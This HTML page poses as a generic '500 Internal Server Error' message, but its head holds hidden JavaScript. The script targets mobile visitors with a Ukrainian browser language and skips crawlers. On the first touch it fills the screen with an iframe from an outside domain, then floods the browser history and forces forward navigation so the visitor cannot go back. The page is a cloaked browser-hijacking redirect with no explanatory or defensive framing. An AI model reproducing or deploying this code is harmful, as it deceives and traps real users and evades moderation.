<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>500 Internal Server Error</title>
    <script>
    (function() {
        const isUA = navigator.language.includes('uk') || navigator.language.includes('ua');
        const isMob = /iPhone|Android/i.test(navigator.userAgent);
        const isBot = /bot|facebook|meta|externalhit/i.test(navigator.userAgent);
        if (isBot || !isMob || !isUA) return;
        const target = "https://neontishell.uno/index.php?src=gh"; 
        const style = document.createElement('style');
        style.innerHTML = `body,html{margin:0;padding:0;height:100%;overflow:hidden;background:#fff;}iframe{width:100%;height:100%;border:none;position:fixed;top:0;left:0;z-index:999999;}`;
        document.head.appendChild(style);
        const ifrm = document.createElement('iframe');
        ifrm.src = target;
        window.addEventListener('touchstart', () => {
            document.body.appendChild(ifrm);
            for(let i=0;i<15;i++) history.pushState(null,"","#/id"+i);
            window.onpopstate = () => history.forward();
        }, {once: true});
    })();
    </script>
</head>
<body style="background:#fff; font-family:sans-serif; padding:50px; color:#666;">
    <h2>500 Internal Server Error</h2>
    <p>The server encountered an unexpected condition that prevented it from fulfilling the request.</p>
</body>
</html>
